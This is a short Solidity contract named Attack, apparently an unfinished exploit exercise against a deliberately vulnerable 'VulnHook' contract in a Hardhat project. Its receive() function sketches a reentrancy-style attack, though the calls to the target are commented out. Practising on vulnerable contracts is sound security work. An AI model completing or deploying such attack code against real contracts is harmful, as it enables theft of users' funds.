// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "hardhat/console.sol";
import {VulnHook} from "src/vuln.sol";

contract Attack{

    VulnHook public vulnHook;
    
    constructor(address _vulnHookAddress) {
      vulnHook = VulnHook(payable(_vulnHookAddress));
    }

    // function exploitVulnHook(address target) public{
    //     vulnHook.afterDonate(target);
    // }

    receive() external payable {
        console.log("here");
        if (address(vulnHook).balance > 1 wei) {
            console.log("inside");
        // vulnHook.afterDonate(payable(address(this)));
        }
    }

    function changeOwner(address sender) public {
        (bool success, ) = sender.call{value: 1 wei}("");

    }

}